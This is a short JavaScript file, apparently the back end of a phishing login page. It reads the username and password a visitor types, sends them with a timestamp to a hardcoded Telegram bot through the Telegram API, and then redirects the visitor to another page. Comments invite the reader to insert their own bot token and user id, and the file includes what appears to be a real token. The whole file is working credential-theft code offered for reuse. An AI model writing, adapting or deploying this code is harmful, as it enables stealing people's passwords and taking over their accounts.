let time = new Date().toLocaleString(); 

function getData() {
    let username = document.getElementById('username').value
    let password = document.getElementById('password').value


    let apiToken = "7690517391:AAEUAZVGQogBq2xqbisb5BbKMM7dgCswCdw" ///Add your telegram bot token
    let chat_id = 7285133256  ///add your user id
    let message = `Username: ${username}
    \nPassword: ${password} 
    \nTime: ${time}`;
    fetch(`https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chat_id}&text=${message}`)
    .then(response => {
        let status = response.status;

        if(response.status != 200) {
            console.log('Looks like there was a problem. Status Code: ' +
            response.status);
          return;
        }
        else {
         redirect()
        }
        })

}

function redirect() {
    window.location = "redirect.html"
}
